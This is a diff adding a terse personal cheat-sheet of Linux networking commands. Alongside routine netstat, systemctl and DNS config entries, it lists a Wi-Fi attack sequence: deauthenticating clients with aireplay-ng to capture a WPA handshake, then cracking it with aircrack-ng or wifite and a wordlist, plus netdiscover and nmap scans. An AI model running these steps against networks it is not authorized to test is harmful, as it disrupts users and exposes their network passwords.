@@ -1,0 +1,44 @@
+#############
+# NETWORKING
+#############
+
+------
+/etc/proxychains4.conf			# proxychains config
+/etc/dhcp/dhclient.comf			# dns manual config
+/etc/resolv.conf				# dns network config
+------
+
+------
+# netstat
+netstat -natu | grep 'ESTABLISHED'
+netstat -natu | grep 'LISTENING'
+------
+
+------
+systemctl start/restart networking
+systemctl stop networking
+systemctl status networking
+------
+
+------
+# handshake
+ipconfig/iwconfig
+airmon-ng start (wlan0)
+airodump-ng (wan0mon)			
+# note bssid, station, channel, beacon
+airodump-ng -c2 -w (capture) -d (station) (wlan0mon)
+# kick off network to capture 4-way handshake
+aireplay-ng --deauth 0 -a (bssid) -c (station) wlan0mon
+# View capture.cap file in Wireshark (eapol filter)
+aircrack-ng capture.cap -w (wordlist.txt)
+------
+
+------
+sudo wifite --wpa --dict (file.txt) --kill
+------
+
+------
+netdiscover -r 192.168.0.0/24			discover devices in the network
+nmap 192.168.1.0						use nmap on target ip
+# use browser to navigate http site
+------
